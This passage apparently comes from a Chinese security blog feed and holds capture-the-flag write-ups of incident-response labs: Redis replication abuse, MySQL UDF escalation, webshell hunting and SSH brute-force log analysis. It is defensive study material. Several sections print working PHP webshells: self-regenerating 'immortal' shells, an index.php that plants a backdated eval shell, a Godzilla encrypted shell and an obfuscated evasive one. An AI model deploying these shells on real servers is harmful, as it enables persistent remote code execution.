深度扫描，扫描完成之后结果会保存为result.csv文件</span><br>./hm scan &lt;要扫描的目录&gt; <span class="hljs-comment">#扫描完成之后结果会保存为result.csv文件，使用记事本或者excel打开查看</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644896.png" alt="image-20240711183620135"></p><p>查找反弹shell的地址，我们可以看看error.log有没有什么异常的地方</p><p><img src="http://cdn.clown2024.cn/202407151644897.png" alt="image-20240711183935052"></p><p>感觉&#x2F;tmp&#x2F;1.sh有点奇怪，去看一下</p><p><img src="http://cdn.clown2024.cn/202407151644898.png" alt="image-20240711184013639"></p><p>可以发现是一个bash的反弹shell指令，找到反弹的地址，flag{192.168.100.13}</p><p>这个文件在&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;下也有</p><p><img src="http://cdn.clown2024.cn/202407151644899.png" alt="image-20240712001549368"></p><p>寻找黑客提权的完整路径，这里能够提权应该泄露了一些用户信息，我们发现在web目录下的common.php里面有root用户的信息</p><p><img src="http://cdn.clown2024.cn/202407151644900.png" alt="image-20240712002457267"></p><p>mysql常规的提权套路就是udf提权，如果是的话那么应该就会在 &#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;留下文件痕迹，我们去看一下</p><p><img src="http://cdn.clown2024.cn/202407151644901.png" alt="image-20240711184502176"></p><p>那提权路径就是&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;udf.so，flag{b1818bde4e310f3d23f1005185b973e7}</p><p>查看提权后的权限，看一下进程详细信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ps -aux<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644902.png" alt="image-20240711184705362"></p><p>可以看到应该是那个mysql的用户，那么权限就是flag{mysql}</p><p>或者进入到mysql里面用**select sys_eval(“whoami”);**查看当前用户</p><p>参考文章：<a href="https://blog.csdn.net/JACKBREAK/article/details/139037618">https://blog.csdn.net/JACKBREAK/article/details/139037618</a></p><h1><span id="redis应急响应">redis应急响应</span></h1><p>靶机介绍</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">服务器场景操作系统 Linux<br>服务器账号密码 root xjredis<br><br>任务环境说明<br>    注：样本请勿在本地运行！！！样本请勿在本地运行！！！样本请勿在本地运行！！！<br>    应急响应工程师小王某人收到安全设备告警服务器被植入恶意文件，请上机排查<br></code></pre></td></tr></table></figure><p>步骤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">通过本地 PC SSH到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;<br>通过本地 PC SSH到服务器并且分析黑客第一次上传的恶意文件,将黑客上传的恶意文件里面的 FLAG 提交;<br>通过本地 PC SSH到服务器并且分析黑客反弹 shell 的IP 为多少,将反弹 shell 的IP 作为 FLAG 提交;<br>通过本地 PC SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串(flag&#123;黑客的用户-关键字符串&#125; 注关键字符串 xxx-xxx-xxx)。将用户名和关键字符串作为 FLAG提交<br>通过本地 PC SSH到服务器并且分析黑客篡改的命令,将黑客篡改的命令里面的关键字符串作为 FLAG 提交;<br></code></pre></td></tr></table></figure><p>那就先去看一下redis的日志在&#x2F;var&#x2F;log下面</p><p><img src="http://cdn.clown2024.cn/202407151644903.png" alt="image-20240712004115278"></p><p>这里找到一张主从复制时的通信过程图，所以有<strong>Master replied to PING</strong>的字段即为连接成功</p><p><img src="http://cdn.clown2024.cn/202407151644904.png" alt="image-20240712011533382"></p><p><img src="http://cdn.clown2024.cn/202407151644905.png" alt="image-20240712004200679"></p><p>这里很明显应该是一个redis的主从复制，但是都是失败连接，再往下还有尝试其他ip的连接，最后成功的是20的ip</p><p><img src="http://cdn.clown2024.cn/202407151644906.png" alt="image-20240712004754137"></p><p>flag{192.168.100.20}</p><p>既然是主从复制那一般就会上传有so文件，我们用命令查看so文件在哪里</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&#x27;exp.so&#x27;</span> 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644907.png" alt="image-20240712005221837"></p><p>可以看到在根目录下，我们查看内容里面有flag</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">xxd /exp.so<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644908.png" alt="image-20240712005512837"></p><p>flag{XJ_78f012d7-42fc-49a8-8a8c-e74c87ea109b}</p><p>看一下定时任务找反弹shell</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">corntab -l<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644909.png" alt="image-20240712005613810"></p><p>flag{192.168.10.13}</p><p>溯源可以去看一下.ssh下的authorized_keys</p><p><img src="http://cdn.clown2024.cn/202407151644910.png" alt="image-20240712005919183"></p><p>找到了他的用户名</p><p>xj-test-user，然后去github上看一下该用户，可以找到他使用的工具</p><p><img src="http://cdn.clown2024.cn/202407151644911.png" alt="image-20240712010113376"></p><p>再去找他的历史commit</p><p><img src="http://cdn.clown2024.cn/202407151644912.png" alt="image-20240712010420376"></p><p>在first commit里面</p><p><img src="http://cdn.clown2024.cn/202407151644913.png" alt="image-20240712010539821"></p><p>flag{xj-test-user-wow-you-find-flag}</p><p>最后查找篡改的命令，可以直接去&#x2F;usr&#x2F;bin目录下查看，这里改的是ps命令，我就说一开始用ps命令为什么怪怪的</p><p><img src="http://cdn.clown2024.cn/202407151644914.png" alt="image-20240712011217461"></p><p>flag{c195i2923381905517d818e313792d196}</p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>玄机应急响应靶场-第一章</title>
      <link href="/2024/07/02/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%B8%80%E7%AB%A0/"/>
      <url>/2024/07/02/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%B8%80%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<h1><span id="linux入侵排查">Linux入侵排查</span></h1><p>这是靶机的简介</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">账号：root 密码：linuxruqin<br>ssh root@IP<br>1.web目录存在木马，请找到木马的密码提交<br>2.服务器疑似存在不死马，请找到不死马的密码提交<br>3.不死马是通过哪个文件生成的，请提交文件名<br>4.黑客留下了木马文件，请找出黑客的服务器ip提交<br>5.黑客留下了木马文件，请找出黑客服务器开启的监端口提交<br></code></pre></td></tr></table></figure><p>先简单了解一下不死马，参考文章：<a href="https://cloud.tencent.com/developer/article/1922141">https://cloud.tencent.com/developer/article/1922141</a></p><p><a href="https://blog.csdn.net/weixin_44411509/article/details/129267982">https://blog.csdn.net/weixin_44411509/article/details/129267982</a></p><p>不死马的原理就是其进程不会消亡，在内存中不断创建木马文件，从而达到无法删除的目的。</p><p>下面是一个不死马例子：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;shell.php&quot;</span>, <span class="hljs-variable">$content</span>);<br><span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">10000</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1. ignore_user_abort()函数：函数设置与客户机断开是否会终止脚本的执行，如果设置为true，则忽略与用户的断开；也就是访问了这个页面之后，脚本会一直在后台执行。<br>2. set_time_limit()函数：设置允许脚本运行的时间，单位为秒。如果设置为0（零），没有时间方面的限制。<br>3. unlink(__FILE__)函数：删除文件本身。<br>4. file_put_contents函数：将一个字符串写入文件。<br>5. usleep函数：延迟执行当前脚本若干微秒（一微秒等于一百万分之一秒）。<br></code></pre></td></tr></table></figure><p>还可以给不死马加一个密码：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br>    <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;.ZYGS.php&#x27;</span>;<br>    <span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_GET[&quot;zygs&quot;])==&quot;e10adc3949ba59abbe56e057f20f883e&quot;)&#123;@eval($_POST[&quot;ZYGS&quot;]);&#125;?&gt;&#x27;</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>        <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">5000</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>要清除不死马的话就需要通过重启主机或服务，或者条件竞争的方式修改文件内容</p><p><strong>开始排查</strong></p><p>先进web目录，看到一个1.php里面是一句话木马</p><p><img src="http://cdn.clown2024.cn/202407151645934.png" alt="image-20240709111702355"></p><p>查看开放的端口：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">netstat -pantu<br><span class="hljs-meta prompt_">#</span><span class="language-bash">--------</span><br>-p 表示显示进程标识符和/或进程名称，这可以帮助你查看哪个进程正在使用网络连接。<br>-a 表示显示所有活动的 TCP 连接和监听端口。<br>-n 表示以数字形式显示地址和端口号，不进行域名解析。<br>-t 表示显示 TCP 表。<br>-u 表示显示 UDP 表。<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645935.png" alt="image-20240709112640729"></p><p>用该命令查找特征文件：</p><figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">find ./ -name <span class="hljs-string">&quot;*.php&quot;</span> | xargs grep <span class="hljs-string">&quot;eval(&quot;</span><br><span class="hljs-comment">#将标准输入数据转换成命令行参数，也就是将find的输入变成命令行参数传递给grep命令</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645936.png" alt="image-20240709112605958"></p><p>去查一下密码为<strong>hello</strong></p><p><img src="http://cdn.clown2024.cn/202407151645937.png" alt="image-20240709112733521"></p><p>看一下index.php的内容可以知道通过该文件生成：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><span class="hljs-keyword">include</span>(SYS_ROOT.INC.<span class="hljs-string">&#x27;common.php&#x27;</span>);<br><span class="hljs-variable">$path</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PATH_INFO&#x27;</span>].(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]?<span class="hljs-string">&#x27;?&#x27;</span>.<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;?&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]):<span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$path</span>, <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)==<span class="hljs-string">&#x27;/&#x27;</span>)&#123;<br>        <span class="hljs-variable">$path</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$path</span>,<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-variable">$path</span> = <span class="hljs-title class_">Base</span>::<span class="hljs-title function_ invoke__">safeword</span>(<span class="hljs-variable">$path</span>);<br><span class="hljs-variable">$ctrl</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]:<span class="hljs-string">&#x27;run&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;createprocess&#x27;</span>]))<br>&#123;<br>        <span class="hljs-title class_">Index</span>::<span class="hljs-title function_ invoke__">createhtml</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]:<span class="hljs-number">0</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cat&#x27;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;single&#x27;</span>]);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title class_">Index</span>::<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$path</span>);<br>&#125;<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;/var/www/html/.shell.php&#x27;</span>;<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;5d41402abc4b2a76b9719d911017c592&quot;)&#123;@eval($_POST[cmd]);&#125;?&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$code</span>);<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2021-01-01 00:00:01&quot; .shell.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">3000</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>黑客留了一个木马文件，就是<strong>shell(1).elf</strong>文件</p><p><img src="http://cdn.clown2024.cn/202407151645938.png" alt="image-20240709113120553"></p><p>可以看到没有可执行权限，这里加一个权限，然后开另一个端口查看端口情况</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 777 shell\(1\).elf<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645939.png" alt="image-20240709113441330"></p><p>最后可以看到其ip为<strong>10.11.55.21</strong>，端口为3333</p><p>最终的各个flag如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">flag&#123;1&#125;<br>flag&#123;hello&#125;<br>flag&#123;index.php&#125;<br>flag&#123;10.11.55.21&#125;<br>flag&#123;3333&#125;<br></code></pre></td></tr></table></figure><h2><span id="用工具的做法">用工具的做法</span></h2><p>用D盾来进行扫描,不过D盾没有Linux版本，所以需要通过将远程的Linux文件系统挂载到Windows上面，然后用D盾扫即可。</p><p>这里参考这篇文章来布置：<a href="https://developer.aliyun.com/article/1341008">https://developer.aliyun.com/article/1341008</a></p><p>采用的方法是<strong>winfsp + sshfs-win</strong>，这两个直接网上下载安装好即可：<a href="https://winfsp.dev/rel/">https://winfsp.dev/rel/</a></p><p>第一种方法是右击此电脑选择映射网络驱动器：</p><p><img src="http://cdn.clown2024.cn/202407151645940.png" alt="image-20240709122109922"></p><blockquote><p>或者输入sshfs.r，sshfs是挂载用户家目录，sshfs.r是挂载远程的根目录</p><p>点击完成后输入密码即可挂载</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151645941.png" alt="image-20240709122150458"></p><p>然后直接用D盾进行扫描web目录：</p><p><img src="http://cdn.clown2024.cn/202407151645942.png" alt="image-20240709122701725"></p><p>或者用sshfs-manage(sshfs的界面化工具，要单独再去下载)将Linux目录挂载到Windows，这里就懒得试了😥</p><p>还可以用net use命令挂载：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">net use              //列出所有网络连接<br>net use Z: /del      //删除本机映射的Z盘 <br>net use * /del /y    //删除所有映射和IPC$<br>net use Z: \\sshfs\root@192.168.1.120\/         //将对方根目录映射为Z盘<br>net use Z: \\sshfs.r\root@192.168.1.120         //将对方根目录映射为Z盘<br>net use Z: \\sshfs.r\root@192.168.1.120!1234    //将对方根目录映射为Z盘（其他端口）<br></code></pre></td></tr></table></figure><h1><span id="weshell查杀">weshell查杀</span></h1><p>靶机简介</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">靶机账号密码 root xjwebshell<br>1.黑客webshell里面的flag flag&#123;xxxxx-xxxx-xxxx-xxxx-xxxx&#125;<br>2.黑客使用的什么工具的shell github地址的md5 flag&#123;md5&#125;<br>3.黑客隐藏shell的完整路径的md5 flag&#123;md5&#125; 注 : /xxx/xxx/xxx/xxx/xxx.xxx<br>4.黑客免杀马完整路径 md5 flag&#123;md5&#125;<br></code></pre></td></tr></table></figure><p>直接上D盾扫，用的还是上面的方法</p><p><img src="http://cdn.clown2024.cn/202407151645943.png" alt="image-20240709155032413"></p><p>先看一个简单的shell文件</p><p><img src="http://cdn.clown2024.cn/202407151645944.png" alt="image-20240709155214961"></p><p>这就是一个简单的webshell</p><p>再找找其他的，在gz.php找的的webshell比较特别</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">session_start</span>();<br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><span class="hljs-comment">//027ccd04-5065-48b6-a32d-77c704a5e26d</span><br><span class="hljs-variable">$payloadName</span>=<span class="hljs-string">&#x27;payload&#x27;</span>;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;3c6e0b8a9c15224a&#x27;</span>;<br><span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$data</span>!==<span class="hljs-literal">false</span>)&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]))&#123;<br>        <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>],<span class="hljs-variable">$key</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)===<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$payload</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">encode</span>(@<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$data</span>),<span class="hljs-variable">$key</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$data</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这是第一个flag，flag{027ccd04-5065-48b6-a32d-77c704a5e26d}</p><p>然后就是看是什么类型的webshell，这里可以明显看到是哥斯拉的流量特征，是哥斯拉里面的一个异或加密脚本</p><p>哥斯拉的github地址：<a href="https://github.com/BeichenDream/Godzilla%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BF%9B%E8%A1%8Cmd5%E5%B0%B1%E6%98%AFflag%EF%BC%8Cflag%7B39392de3218c333f794befef07ac9257%7D">https://github.com/BeichenDream/Godzilla，然后进行md5就是flag，flag{39392de3218c333f794befef07ac9257}</a></p><p>隐藏shell就是上面D盾查找出的.Mysqlli.php</p><p><img src="http://cdn.clown2024.cn/202407151645945.png" alt="image-20240709160839574"></p><p>也是一个哥斯拉的shell，路径就为：&#x2F;var&#x2F;www&#x2F;html&#x2F;include&#x2F;Db&#x2F;.Mysqli.php，flag为flag{aebac0e58cd6c5fad1695ee4d1ac1919}</p><p>最后一个是免杀马，这里静态检测就检测不到了，但是webshell执行的话会在日志留下记录，可以去日志里面看一看，Linux的日志在**&#x2F;var&#x2F;log**目录下</p><p>不过D盾已经把他扫出来了，就是top.php，我们也可以在日志access.log中看到他的记录</p><p><img src="http://cdn.clown2024.cn/202407151645946.png" alt="image-20240709161714553"></p><p>top.php内容如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$key</span> = <span class="hljs-string">&quot;password&quot;</span>;<br><br><span class="hljs-comment">//ERsDHgEUC1hI</span><br><span class="hljs-variable">$fun</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func&#x27;</span>]);<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$fun</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-variable">$fun</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$fun</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">7</span>];<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;a&quot;</span>;<br><span class="hljs-variable">$s</span> = <span class="hljs-string">&quot;s&quot;</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$a</span>.<span class="hljs-variable">$s</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;func2&quot;</span>];<br><span class="hljs-variable">$c</span>(<span class="hljs-variable">$fun</span>);<br></code></pre></td></tr></table></figure><p>这里进行了混淆和加密，路径md5就是flag，flag{EEFF2EABFD9B7A6D26FC1A53D3F7D1DE}</p><p>参考文章：<a href="https://blog.csdn.net/administratorlws/article/details/139521078%EF%BC%8C%E9%87%8C%E9%9D%A2%E6%9C%89%E6%89%8B%E5%B7%A5%E6%9F%A5%E6%9D%80%E7%9A%84%E6%96%B9%E5%BC%8F%EF%BC%8C%E6%80%BB%E7%BB%93%E4%BA%86%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81webshell%E7%89%B9%E5%BE%81">https://blog.csdn.net/administratorlws/article/details/139521078，里面有手工查杀的方式，总结了一些常见webshell特征</a></p><p>这里copy一些知识点</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//各webshell的危险函数<br>PHP: eval(), system(), exec(), shell_exec(), passthru(), assert(), base64_decode()<br>ASP: Execute(), Eval(), CreateObject()<br>JSP: Runtime.getRuntime().exec()<br><br>//文件操作<br>PHP: fopen(), fwrite(), file_get_contents(), file_put_contents()<br>ASP: FileSystemObject<br><br>//网络操作<br>PHP: fsockopen(), curl_exec(), file_get_contents(&#x27;http://...&#x27;)<br>ASP: WinHttp.WinHttpRequest<br></code></pre></td></tr></table></figure><p>手工查杀免杀可以看他有没有编码函数</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find ./ <span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;*.php&quot;</span> | xargs grep <span class="hljs-string">&quot;eval(&quot;</span><br></code></pre></td></tr></table></figure><h1><span id="linux日志分析">Linux日志分析</span></h1><p>靶机简介</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">账号root密码linuxrz<br>ssh root@IP<br>1.有多少IP在爆破主机ssh的root帐号，如果有多个使用&quot;,&quot;分割<br>2.ssh爆破成功登陆的IP是多少，如果有多个使用&quot;,&quot;分割<br>3.爆破用户名字典是什么？如果有多个使用&quot;,&quot;分割<br>4.登陆成功的IP共爆破了多少次<br>5.黑客登陆主机后新建了一个后门用户，用户名是多少<br></code></pre></td></tr></table></figure><p>首先查看有多少ip在爆破ssh的root账号那就去查看&#x2F;var&#x2F;log下的日志</p><p><img src="http://cdn.clown2024.cn/202407151645947.png" alt="image-20240709182756986"></p><p>看auth.log.1里面的登陆失败信息，这个是auth.log的归档文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/log/auth.log.1 | grep -a <span class="hljs-string">&quot;Failed password for root&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | more<br></code></pre></td></tr></table></figure><p>命令解释：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">cat /var/log/auth.log.1：cat 命令用于连接文件并打印到标准输出设备，这里是用来显示 /var/log/auth.log.1 文件的内容。<br><br>grep -a &quot;Failed password for root&quot;：grep 命令用于搜索包含特定文本的行。这里搜索的是包含文本 &quot;Failed password for root&quot; 的行，表示 root 用户登录失败的事件。-a 选项是告诉 grep 以文本文件的方式处理二进制文件，保证输出的一致性。<br><br>awk &#x27;&#123;print $11&#125;&#x27;：awk 是一个强大的文本处理工具。这里 &#123;print $11&#125; 表示打印每行的第11个字段。在 auth.log 中，第11个字段通常是登录失败时尝试使用的用户名。<br><br>sort：sort 命令对输入的行进行排序。由于前面 awk 输出的是 root 用户的登录失败行，这里的 sort 将这些行进行字典序排序。<br><br>uniq -c：uniq 命令用于过滤掉排序后的重复行。-c 选项表示在每行前显示该行在文件中出现的次数。<br><br>sort -nr：再次使用 sort 命令，-n 选项表示按照数值排序，-r 选项表示降序排序。这里对 uniq 命令的输出结果按出现次数进行降序排序。<br><br>more：more 命令用于分页显示输出结果，允许用户逐步查看长输出，而不是一次性显示所有内容。<br></code></pre></td></tr></table></figure><p>可以找到3个ip</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">192.168.200.2<br>192.168.200.32<br>192.168.200.31<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645948.png" alt="image-20240709183107694"></p><p>爆破成功的用户就去查”Accepted”的字段</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/log/auth.log.1 | grep -a <span class="hljs-string">&quot;Accepted&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | more<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645949.png" alt="image-20240709183249678"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">192.168.200.2<br></code></pre></td></tr></table></figure><p>爆破用户命的字典就查”Failed password”字段</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs BASH"><span class="hljs-built_in">cat</span> /var/log/auth.log.1 | grep -a <span class="hljs-string">&quot;Failed password&quot;</span> |perl -e <span 